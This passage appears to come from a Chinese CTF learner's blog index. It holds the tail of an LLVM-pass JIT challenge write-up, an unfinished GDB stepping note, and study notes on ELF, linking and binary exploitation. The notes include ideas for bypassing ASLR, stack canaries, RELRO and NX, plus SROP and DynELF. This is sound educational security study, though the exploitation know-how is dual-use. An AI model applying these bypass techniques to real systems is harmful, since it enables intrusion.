__int64 a2)&#123; return this[4]((_anonymous_namespace_::MBAPass *)this, a2);&#125; ​ 可以看到这个函数是直接调用this[4] ​ 回到 1234this[5] = this[4]; mprotect(this[4], 0x1000uLL, 3); `anonymous namespace&#x27;::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29); mprotect(this[4], 0x1000uLL, 5); ​ 这里首先在this[4]开辟了一个0x1000的可执行空间。然后执行handle,最后callCode执行这个this[4]。那么来看handle。 ​ 这里的逻辑第一次看比较费解。回想一下之前的知识，llvm pass 是用来处理IR代码的，这里的this实际是用来储存需要处理的IR代码，所以前面的逻辑是：利用handle处理IR代码，最后执行处理完的代码。 ​ handle的逻辑比较复杂，目前还没有逆明白，先挑一段出来： 12345678if ( (((__int64 (__fastcall *)(__int64 *))llvm::isa&lt;llvm::Constant,llvm::Value *&gt;)(&amp;Operand) &amp; 1) != 0 )// if operant = 1 &#123; *((_DWORD *)this + 12) = 0; v2 = (llvm::ConstantInt *)((__int64 (__fastcall *)(__int64))llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;)(Operand);// if arg =1 SExtValue = get_sextvalue(v2); `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, SExtValue);// mov imm64 return `anonymous namespace&#x27;::MBAPass::writeRet(this);// ret &#125; ​ ​ 调用了一堆看不懂的函数，然后一个比较关键的SExtValue即储存了需要被处理的IR代码，再调用writeMovImm64(this, 0, SExtValue)函数。 1234567891011121314151617_anonymous_namespace_::MBAPass *__fastcall `anonymous namespace&#x27;::MBAPass::writeMovImm64( _anonymous_namespace_::MBAPass *this, int a2, __int64 a3)&#123; _anonymous_namespace_::MBAPass *result; // rax **((_BYTE **)this + 5) = 0x48; if ( a2 ) *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xBB;// movabs rbx, xxx else *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xB8;// movabs rax,xxx result = this; *(_QWORD *)(*((_QWORD *)this + 5) + 2LL) = a3; *((_QWORD *)this + 5) += 10LL; return result;&#125; ​ ​ 可以大致知道这里的功能就是将我们传入的IR指令翻译为机器码，具体可以看ayaka师傅的博客。 ​ 于是同理，下面的writeRet(this)也是在this + 5的地方插入ret。 ​ 玄学地理解一下，handle函数就是将ir翻译为机器码执行。具体的细节之后再研究。 ​ 然后看题，漏洞出在 1v30 = *((_QWORD *)this + 4) + 0xFF0LL; ​ 缓冲区大小为0x1000（可以在mmap处看到），但是这里this+4却写成0xFF0，但是每次执行的时候缓冲区不会被清空，且都会执行0x1000字节的代码，所以多了八个可以供我们写的字节，我们可以控制写入的字节数，继而控制程序执行我们写入的指令。 ​ ayaka给出的思路是，第一次JIT时，在0xff0处，将jmp指令假装成操作数的样子写入，第二次jit时，只生成0xff0长度的指令， 于是程序就会继续执行jmp。 调试首先 1sudo apt install llvm-12 gdb调试opt，设置参数为启动参数。 先在llvm::Pass::preparePassManager下断点，然后可以断在MBAPass::runOnFunction。 执行到这里，就是利用mprotect设置缓冲区为可执行。 跟进handle函数，但其实没有什么好看的，直接finish。 跳过handle后，可以看到code被写入了，用的akaya师傅的测试exp。 编写好exp后： exp大致逻辑就是第一次jit填充0xff0size的指令，没有任何用处，然后在0x7ffff7ffbff2上写jmp shellcode，shellcode的地址就在前面0x1000的地方找一个，第二次jit时写上即可。shellcode的编写有很大的限制。 偷一个师傅的图： https://lakwsh.net/?p=457 效果大概是这样。 总结这个漏洞的点比较怪，我看其他的类似的题也没有类似的点，但是确实能够总结出一些简单的做题规律。 首先找runOnFunction,这个函数就相当于elf的main，然后如果是pass类，那么其主要漏洞也许都是发生在处理IR的过程中，搞清几个变量的含义之类的很重要（我现在还看不太明白那个处理的过程）。 最后是调试，调试的话直接gdb opt+set args，然后需要先断在llvm::Pass::preparePassManager，然后环境中才会有那些什么mbaPass::的符号。 pass逻辑还没整明白，再做几个题吧。 参考https://zhuanlan.zhihu.com/p/290946850 https://zhuanlan.zhihu.com/p/122522485 https://bbs.pediy.com/thread-273229.html https://bbs.pediy.com/thread-273119.html","categories":[{"name":"LLVM","slug":"LLVM","permalink":"https://fuurinko.github.io/categories/LLVM/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"mess_GDB中ni与si的魔法","slug":"mess_GDB 中ni 与 si的魔法","date":"2022-10-24T11:57:06.272Z","updated":"2022-10-24T15:03:19.122Z","comments":true,"path":"2022/10/24/mess_GDB 中ni 与 si的魔法/","link":"","permalink":"https://fuurinko.github.io/2022/10/24/mess_GDB%20%E4%B8%ADni%20%E4%B8%8E%20si%E7%9A%84%E9%AD%94%E6%B3%95/","excerpt":"","text":"​ 关于gdb中ni 、n、si、s的区别，是一个很基础的问题：n/s都是C语言级的断点定位。s会进入C函数内部，n不会。ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部, ni不会。 ​ 然而众所周知，gdb下软件断点的原理是在代码中插入 int 3，引发中断后执行系统调用ptrace，那么同样是插入指令，为什么这两种指令会有不同影响？ gdb指令级单步的实现首先还是复习一下老生常谈（的软硬断点问题。 硬件单步指cpu架构（如x86、ppc）本身支持指令级单步，目标程序可以在运行一条指令后自动停止。x86是通过设置EFLAGAS寄存器中的TF标志将cpu置于单步模式。cpu每执行一条指令，就会产生一个单步异常，通知gdb处理。 next&amp;step命令即n指令。 执行next命令时，gdb会计算出当前停止位置的c语句的第一条指令的地址作为step_range_start,下一行的c语句的第一条指令地址作为step_range_end。next命令的结束条件为 1pc&lt; step_range_start || pc &gt;= step_range_end 这里可以简单地理解为当pc离开当前执行的代码就算一次next指令的完成。 那么next指令是如何跳过函数调用的呢？ 事实上是当gdb发现子函数第一条指令为函数调用后，就立即在函数返回地址插入一个临时断点，并一直运行到该断点处。 step指令与next都是c源码级别的单步，只不过并不会跳过函数调用。 next i&amp;stepi指令加上“i”后，gdb实现指令级单步。 回答基于我个人的理解，可以将si认为是单步的最小单位，而不同的指令只是不同函数功能的体现罢了。 这样回答似乎很弱智，真的很弱智？ 真的有这么简单吗？？？来看breakpoint.c（ps：gdb的源码我感觉有一点点乱，这个文件不在子文件夹中） 代码还是蛮长的，有一万五千多行，光是找到函数就已经是个体力活了。 还没写完，鸽一下，去看llvm了，最近高强度学习新知识ing。 参考https://www.cnblogs.com/tsecer/category/1413042.html https://blog.csdn.net/xuchenhuics/article/details/79680435 https://www.docin.com/p-18618736.html https://cloud.tencent.com/developer/article/1823077","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"GDB","slug":"GDB","permalink":"https://fuurinko.github.io/tags/GDB/"}]},{"title":"基础知识","slug":"sum_基础知识点总结","date":"2022-10-22T15:33:18.118Z","updated":"2022-10-24T03:18:09.693Z","comments":true,"path":"2022/10/22/sum_基础知识点总结/","link":"","permalink":"https://fuurinko.github.io/2022/10/22/sum_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","excerpt":"","text":"这是一些也许很基础但是一直没有搞透彻or忘了or巩固的一些知识点的集合，空的就是还没有来得及填， 编程语言cpython汇编首先就是寻址的几种方式： 1）寻址1/直接寻址1mov rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。 2/间接寻址间接在使用指针以及解引用的形式 1mov [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。 3/比例寻址例如在数组遍历中 12345.dataarrayD 1,2,3,4.codemov esi,3mov eax,arrayD[esi*4] ;eax = 4 其中，比例因子“4”代表数组的元素个数，esi的值代表下标。 2）段寄存器其实就是段的基址，起寻址索引作用。例子就比如 mov rax fs：28h 然后是一些常见的寄存器含义。 最后是一些容易忘，但是一定要记住的指令。 二进制栈漏洞利用保护机制由于面向的是底层原理，所以在这个part，每一个机制都将围绕以下几个部分阐述： 源码层面的原理 动态分析中的具体行为 利用的方式 aslr&amp;pie原理&amp;行为一些参数 1230 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 ASLR对libc段，栈以及堆的加载地址进行随机化，而PIE对代码段.text, 数据段.*data，.bss等固定地址进行随机化，弥补了aslr的不足。 aslr的绕过原理： 由于内存的页载入机制，PIE的随机化只能影响到单个内存页，也就是说地址只会以一个内存页为单位进行变化。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此我们找到目标地址的后三个十六进制数，然后想办法将返回地址（被压入的ip）后三个十六进制数覆盖成目标地址，从而达到劫持程序流程的目的。 绕过 爆破 泄露某个库的真实地址，利用固定偏移绕过。 canary原理&amp;行为针对每个进程，在stack中（具体位置是rbp&amp;ebp前）插入一串以字节\\x00结尾（防止泄露）的随机数，长度大概是qword。 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 可以看到是从fs寄存器0x28偏移的值中取值，然后给到rbp - 8的位置，然后在函数返回前将这个值与目前rbp-8的值异或，若为0则正常返回，否则报错。 fs寄存器？fs寄存器指向栈的 TLS 结构： 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; //fs:0x28 ...&#125; tcbhead_t; 绕过绕过思路： 劫持__stack_chk_fail的got表。 直接利用程序漏洞提供的内存泄露，覆盖Canary的低字节，拿到Canary的值。 fork（）产生的子进程中Canary值不变，可以利用其爆破泄露。 覆盖fs:0x28指向的tls结构的stack_guard，从源头根除Canary（bushi）。 relro对dynamic linker处理过 relocation设置为只读。 ” Partial RELRO” ：设置got表为只读。 ” FULL RELRO” ：对所有重定位表项设置为只读。 绕过：在partial relro的情况下还是可以使用ret2dl。full relro的话似乎要找那个什么debug。。 nxNX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 在Windows下，类似的概念为DEP（数据执行保护） 绕过rop FORTIFYfority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。 _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能 _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。 gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;) gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序) 绕过由于一般这个保护在编译时就已经将危险的函数优化了，所以没有什么可绕过之说。（我感觉） 漏洞略，这个其实比较简单。。 栈溢出整数溢出格式化字符串对于每一个 %s，printf() 都会从栈上取一个数字，把该数字视为地址，然后打印出该地址指向的内存内容，由于不可能获取的每一个数字都是地址，所以数字对应的内容可能不存在，或者这个地址是被保护的，那么便会使程序崩溃。 数组越界ROPret2dlsrop当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。 ​ 所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。 具体利用：可以利用sys_sigreturn将伪造的栈内内容恢复到寄存器上。 ret2csutrickDynELF​ DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。 搜索主要为两步： 寻找elf文件加载基址：基地址内存页起始的字符串为\\0x7fELF，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。 寻找glibc加载基址：efl在内存中有一个叫做link_map的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表，其中包含了每个动态加载的库的路径和加载基址等信息。对于如何找到link_map ,一般来说有两种方式，在full relro以外的elf中，可以在Dynamic段的.got.plt节中找到，对于启用full relro的elf，可以在Dynamic段的DT_DEBUG中找到。Dynamic段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。 二进制堆漏洞利用略 off by oneunlinkchunk overlappinghouse series操作系统基础（重要）中断利用int 0x80=&gt; syscall来实现内核陷入。 函数调用栈寄存器传参规则（32&amp;64）调用约定stdcall 参数从右向左压入堆栈 函数自身修改堆栈 函数的装饰名(decoration name/mangling name)为函数名自动加前导的下划线, 后面紧跟一个@符号, 其后紧跟着参数的尺寸 12345678910111213#caller push 2; 第二个参数入栈 push 1; 第一个参数入栈 call function; 调用函数, 注意此时自动把cs:eip入栈 #callee push ebp; 保存ebp寄存器, 该寄存器将用来保存堆栈的栈顶指针, 可以在函数退出时恢复 mov ebp, esp; 保存栈顶指针 mov eax, [ebp + 8H]; 堆栈中ebp指向位置之前依次保存有ebp, cs:eip, a, b, ebp +8指向a add eax, [ebp + 0CH]; 堆栈中ebp + 12处保存了b mov esp, ebp; 恢复esp pop ebp; ret 8; cdecl（c语言缺省调用约定） 参数从右向左压入堆栈 调用者函数修改堆栈 1234567891011121314 #caller push 1; push 2; call function; // push retn ; jmp retn(esp - 8) add esp, 8; //注意, 这里调用者再恢复堆栈#calleepush ebp; 保存ebp, 该寄存器将用来保存堆栈的栈顶指针, 可以在函数退出时恢复mov ebp, esp; 保存栈顶指针mov eax, [ebp + 8H]; 堆栈ebp指向位置之前依次保存有ebp, cs:eip, a, b, ebp + 8指向aadd eax, [ebp + 0CH]; 堆栈中ebp + 12处保存了bmov esp, ebp; 恢复esppop ebp;ret; // pop rsp , jmp retn(esp + 8) fastcall 函数的第一个和第二个DWORD参数（或者尺寸更小的）通过ecx和edx传递, 其他参数通过从右向左的顺序压栈 被调用函数清理堆栈 修饰名为函数名前加上一个“@”符号，后面也是一个“@”符号和其参数的字节数 可以看到调用时，压栈的顺序是： 返回地址，ebp、局部变量、函数参数（从右往左） 参数传递x64依次传参：RDI，RSI，RDX，RCX，R8，R9 第七个开始则从右向左。 x86根据调用约定用栈传参。 elf文件结构elf文件头：稍微看了一眼，感觉没什么特别值得记的。 节通过file或readelf就是读取elf的文件头。 .text .data .bss 链接视角：section 加载视角：segment .strtab / .shstrtab 字符串表 在ELF文件中，会用到很多字符串，比如节名，变量名等。所以ELF将所有的字符串集中放到一个表里，每一个字符串以’\\0’分隔，然后使用字符串在表中的偏移来引用字符串。这样在ELF中引用字符串只需要给出一个数组下标即可。字符串表在ELF也以段的形式保存， .shstrtab是专供section name的字符串表。 .symtab 符号表 在链接的过程中需要把多个不同的目标文件合并在一起，不同的目标文件相互之间会引用变量和函数。在链接过程中，我们将函数和变量统称为符号，函数名和变量名就是符号名。 每个定义的符号都有一个相应的值，叫做符号值(Symbol Value)，对于变量和函数，符号值就是它们的地址。 .rel.text： 一个 .text 节中位置的列表，当链接器把这个目标文件和其他文件组合时，需要修改这些位置。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面，调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非用户显式地指示链接器包含这些信息。 .rel.data 被模块引用或定义的所有全局变量的重定位信息。一般而言，任何已初始化的全局变量，如果它的初始值是一个全局变量地址或者外部定义函数的地址，都需要被修改。 .eh_frame / .eh_frame_hdr 在调试程序的时候经常需要进行堆栈回溯，早期使用通用寄存器(ebp)来保存每层函数调用的栈帧地址，但局限性很大。后来现代Linux操作系统在LSB(Linux Standard Base)标准中定义了一个.eh_frame section，用来描述如何去unwind the stack。。当函数执行入栈指令后，在该段会保存跟入栈指令一一对应的编码数据，根据这些编码数据，就能计算出当前函数栈大小和cpu的哪些寄存器入栈了，在栈中什么位置。 太长不看：记录入栈指令，用来实现栈回溯（用于调试） https://zhuanlan.zhihu.com/p/302726082 其他为什么要将数据与代码分开： 可以对不同的节实现不同的权限，例如对数据段设置为可写可读，代码段则设置为只读。 ida中的elf文件 链接&amp;重定位首先汇编器生成了起始地址为0的代码段和数据段构成的可重定位目标模块。 这一组模块被输入到链接器中。 可重定位目标模块可重定位目标模块是什么？ 就比如说一个文件由四个模块组成，编译器最终的目标是将这四个可重定位目标模块组合成一个可执行文件。 每个模块包含了自己的函数和变量，我们将这些函数和变量统称为符号。 符号表而每个可重定位目标模块m都有一个由汇编器构造的符号表，它包含 m 定义和引用的符号的信息。 符号表中有三种不同的符号： 由模块 m 定义并能被其他模块引用的全局符号。全局链接器符号对应于非静态的 C 函数和全局变量。 由其他模块定义并被模块 m 引用的全局符号。这些符号称为外部符号，对应于在其他模块中定义的非静态 C 函数和全局变量。 只被模块 m 定义和引用的局部符号。它们对应于带 static 属性的 C 函数和全局变量。这些符号在模块 m 中任何位置都可见，但是不能被其他模块引用。 我们这里不关注于符号表具体的条目，只是想说明整个链接的流程。 有了可重定位模块及其符号表，链接器下一步需要做的就是将模块中引用的符号与符号表中确定的符号定义关联起来。 这里我想要举一个具体的例子。 这是hello world 程序的可重定位目标文件。 很显然main+0x15的地方只是下一条指令，似乎和我们想要的printf没有什么关联。 123456root@--name:/ctf/work# readelf -x 11 hello.oHex dump of section &#x27;.strtab&#x27;: 0x00000000 0068656c 6c6f2e63 006d6169 6e005f47 .hello.c.main._G 0x00000010 4c4f4241 4c5f4f46 46534554 5f544142 LOBAL_OFFSET_TAB 0x00000020 4c455f00 7072696e 746600 LE_.printf. 我们能看到字符串表中的printf 符号表 1234567891011121314Symbol table &#x27;.symtab&#x27; contains 12 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS hello.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 3: 0000000000000000 0 SECTION LOCAL DEFAULT 3 4: 0000000000000000 0 SECTION LOCAL DEFAULT 4 5: 0000000000000000 0 SECTION LOCAL DEFAULT 5 6: 0000000000000000 0 SECTION LOCAL DEFAULT 7 7: 0000000000000000 0 SECTION LOCAL DEFAULT 8 8: 0000000000000000 0 SECTION LOCAL DEFAULT 6 9: 0000000000000000 28 FUNC GLOBAL DEFAULT 1 main 10: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND _GLOBAL_OFFSET_TABLE_ 11: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND printf 这个表的列名对应了符号表的结构，UNDEF 代表未定义的符号，也就是在本目标模块中引用，但是却在其他地方定义的符号。 123456789typedef struct &#123; int name; /* String table offset */ char type:4, /* Function or data (4 bits) */ binding:4; /* Local or global (4 bits) */ char reserved; /* Unused */ short section; /* Section header index */ long value; /* Section offset or absolute address */ long size; /* Object size in bytes */&#125; Elf64_Symbol; 符号解析解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来，这里分为两种情况。 引用和定义都在同一个模块的局部符号引用。 引用和定义在不同模块的符号引用。 重定位这个步骤中，链接器将合并输入模块，并为每个符号分配运行时地址。重定位由两步组成： 重定位节和符号定义。在这一步中，链接器将所有相同类型的节合并为同一类型的新的聚合节。例如，来自所有输入模块的. data 节被全部合并成一个节，这个节成为输出的可执行目标文件的. data 节。然后，链接器将运行时内存地址赋给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个符号。当这一步完成时，程序中的每条指令和全局变量都有唯一的运行时内存地址了。 重定位节中的符号引用。在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。要执行这一步，链接器依赖于可重定位目标模块中称为重定位条目（relocation entry）的数据结构，我们接下来将会描述这种数据结构。 重定位条目代码的重定位条目放在 .rel.text 中。已初始化数据的重定位条目放在 .rel.data 当汇编器遇到一个最终位置未知的引用时，它简单地将立即数0x0放入引用处，并为这个引用生成一个重定位条目放在 .rel .text 中，而这个重定位条目拥有足够多的信息指导链接器在链接时将0x0修改为正确的数值。 重定位条目格式如下 123456typedef struct &#123; long offset; /* Offset of the reference to relocate */ long type:32, /* Relocation type */ symbol:32; /* Symbol table index */ long addend; /* Constant part of relocation expression */&#125; Elf64_Rela; 其实重定位过程算法简单来说就是将未知引用地址改为运行时地址，例如： 1*refptr = (unsigned) (ADDR(r.symbol) + r.addend);//绝对寻址 加载一般情况下（aslr未开启），程序由0x400000开始加载。 当加载器运行时，它创建类似于图 7-15 所示的内存映像。在程序头部表的引导下，加载器将可执行文件的片（chunk）复制到代码段和数据段。接下来，加载器跳转到程序的入口点，也就是 _start函数的地址。这个函数是在系统目标文件 ctrl.o 中定义的，对所有的 C 程序都是一样的。_start 函数调用系统启动函数 __libc_start_main，该函数定义在 libc.so 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。 ![img](https://1087580735-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MHt_spaxGgCbp2POnfq%2F-MI8pquOBkqRu_B1qWTy%2F-MI8q_Q9zCjP43SJa6VX%2F07-15 Linux x86-64 运行时内存映像.png?alt=media&amp;token=9d8f7d7e-ccda-48d1-814a-8a38ccb2ff8a) 动态链接共享库共享库（shared library）是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为动态链接（dynamic linking），是由一个叫做动态链接器（dynamic linker）的程序来执行的，在 Linux 系统中通常用 .so 后缀来表示。微软的操作系统大量地使用了共享库，它们称为 DLL（动态链接库）。 ld - 动态链接器 libc - 动态链接库 插桩Linux 链接器支持一个很强大的技术，称为库打桩（library interpositioning），它允许你截获对共享库函数的调用，取而代之执行自己的代码。使用打桩机制，你可以追踪对某个特殊库函数的调用次数，验证和追踪它的输入和输出值，或者甚至把它替换成一个完全不同的实现。 延迟绑定延迟绑定(Lazy Binding)是动态链接器用来减少程序启动时间的一种技术，延迟绑定就是在函数第一次被调用的时候再和函数地址绑定。 该内容在ret2dl中涉及。（其实学rop的时候也没必要深究我感觉） gotgot表有四项内容: GOT[0]是.dynamic段的装载地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息; GOT[1]是动态链接器的标识link_map的地址; GOT[2] 包含动态链接器的延迟绑定代码_dl_runtime_resolve的入口点，用于得到真正的函数地址，回写到对应的got表中; GOT[3] 开始就是函数的地址。 pltPLT 是 Linux ELF 文件中用于延迟绑定的表。实际内容是一段代码 具体过程假设程序中调用 func 函数，该函数在 .plt 段中相应的项为 func@plt，在 .got.plt 中相应的项为 func@got，链接器在初始化时将 func@got 中的值填充为 “preapre resolver” 指令处的地址。 123func@plt:jmp *(func@got)n//prepare resolverjmp _dl_runtime_resolve 第一次调用 func 函数时，首先会跳转到 PLT 执行 jmp *(func@got)，由于该函数没被调用过，func@got 中的值不是 func 函数的地址，而是 PLT 中的 “preapre resolver” 指令的地址，所以会跳转到 “preapre resolver” 执行，接着调用 _dl_runtime_resolve 解析 func 函数的地址，并将该函数真正的地址填充到 func@got，最后跳转到 func 函数继续执行代码。当再次调用 func 函数时，由于 func@got 中已填充正确的函数地址，此时执行 PLT 中的 jmp *(func@got) 即可成功跳转到 func 函数中执行。 太长不看：首次调用函数时，plt表调用 _dl_runtime_resolve 函数填充got表为真实地址，再次调用时，plt调用got表则直接执行到目标函数。 虚拟内存内存页进程间通信进程间通信：信号、管道、消息队列、共享内存 https://www.cnblogs.com/luo77/p/5816326.html 管道管道的实质是一个内核缓冲区，进程以先进先出的方式从缓冲区存取数据,管道一端的进程顺序地将进程数据写入缓冲区，另一端的进程则顺序地读取数据，该缓冲区可以看做一个循环队列，读和写的位置都是自动增加的，一个数据只能被读一次，读出以后再缓冲区都不复存在了。 pipe（无名管道）通过pipe()系统调用来创建并打开。 fifo（命名管道）通过mknode()系统调用或者mkfifo()函数来建立 消息队列消息队列，就是一个消息的链表，是一系列保存在内核中消息的列表。用户进程可以向消息队列添加消息，也可以向消息队列读取消息。 共享存储共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号两，配合使用，来实现进程间的同步和通信。 例如mmap()就可以实现共享内存。 套接字信号信号是Linux系统中用于进程之间通信或操作的一种机制。信号是在软件层次上对中断机制的一种模拟，是一种异步通信方式，信号可以在用户空间进程和内核之间直接交互。内核也可以利用信号来通知用户空间的进程来通知用户空间发生了哪些系统事件。信号事件有两个来源： 1）硬件来源，例如按下了cltr+C，通常产生中断信号sigint 2）软件来源，例如使用系统调用或者命令发出信号。最常用的发送信号的系统函数是kill,raise,setitimer,sigation,sigqueue函数。软件来源还包括一些非法运算等操作。 有两个信号是应用进程无法捕捉和忽略的，即SIGKILL和SEGSTOP，这是为了使系统管理员能在任何时候中断或结束某一特定的进程。 fork()操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这2个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的完整拷贝，指令指针也完全相同，子进程拥有父进程当前运行到的位置。 网络编程SOCKET编程https://zhuanlan.zhihu.com/p/180556309 上一个part讲了进程间通信的几种常用方式，但是无论哪种，都仅限于本机之间的通信。而网间进程通信要解决的是不同主机进程间的相互通信问题。 同一主机上，不同进程可用进程号（PID）唯一标识。但在网络环境下，各主机独立分配的进程号不能唯一标识该进程。 其次，操作系统支持的网络协议众多，不同协议的工作方式不同，地址格式也不同。因此，网间进程通信还要解决多重协议的识别问题。 例如TCP/IP协议族利用ip地址，协议，端口即可标识网络的进程。使用TCP/IP协议的应用程序通常采用应用编程接口：UNIX BSD的套接字（socket）来实现网络进程之间的通信。 TCP/IP 太具体的什么协议之类的就不放了 socket是什么其实网上讲得都还蛮抽象的，我的理解就是这个东西是一个帮助我们进行tcp/ip通信的工具，就比如说我要给山崎桑送生日礼物，原本我需要拿到山崎桑的地址，然后坐飞机飞到日本，再打车去找他，但是现在有ems国际了，所以我只需要利用国际邮政，填一下地址就行了这样。所以这里这个ems就是socket，地址就是ip和port，它将复杂的协议通信抽象为了一个api。 （说到山崎，今天的日九还没看555，吃饭看吧） socket通信流程socket通信流程如下： 连接 服务器端会根据IP地址类型（IPv4/IPv6)、Socket 类型和协议创建一个socket，并为为 Socket 绑定 IP 地址和端口号，然后监听端口请求，随时准备接收客户端发来的连接。 客户端打开 Socket，根据服务器 IP 地址和端口试图连接服务端的Socket。务器Socket接收到客户端Socket请求，被动打开开始接收客户端请求，直到客户端返回连接信息，此时 Socket 进入阻塞状态。 交互 客户端连接成功向服务端发送连接状态信息 服务端 Accept 返回连接成功 客户端向 Socket 写入数据 服务端读取数据 客户端关闭 linux文件系统概述 /etc：etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /bin：bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。 /proc：proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 /sbin：s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。 /usr： usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。 /usr/src：内核源代码默认的放置目录。 软硬连接软链接为某个文件在另外一个位置建立一个同不的链接。 1ln -s 源文件 目标文件。 硬链接允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。 环境变量。 其他kernel 漏洞kernel uafkernel ropfuzz基本原理Fuzzing引擎算法中，测试用例的生成方式主要有2种： 1）基于变异：根据已知数据样本通过变异的方法生成新的测试用例； 2）基于生成：根据已知的协议或接口规范进行建模，生成测试用例； AFL就是著名的基于变异的Fuzzer。 Fuzzing技术总结（Brief Surveys on Fuzz Testing） 变异：afl中变异其实就是对输入进行移位，reverse等操作。 afl饿 https://blog.csdn.net/gengzhikui1992/article/details/50844857 AFL(American Fuzzy Lop)实现细节与文件变异 AFL内部实现细节小记 AFL的LLVM_Mode syzkaller使用白盒fz。 基本的fuzz代码优化不知道orz llvmv8&amp;Chromehttps://kiprey.github.io/2020/11/fetch-chromium/ https://kiprey.github.io/2020/10/CVE-2020-6549/ https://kiprey.github.io/2020/10/CVE-2019-5826/#一、环境搭建 gdb使用断点原理（内存&amp;硬件&amp;软件断点）软件断点：由非法指令异常实现，适用于运行于内存中的程序（软件实现）。以x86为例，向某个地址打入断点，实际上就是往该地址写入断点指令INT 3，即0xCC。目标程序运行到这条指令之后就会触发SIGTRAP信号，gdb捕获到这个信号，根据目标程序当前停止位置查询gdb维护的断点链表，若发现在该地址确实存在断点，则可判定为断点命中。 硬件断点：由硬件特性实现（数量有限），适用于直接在flash中运行的程序。 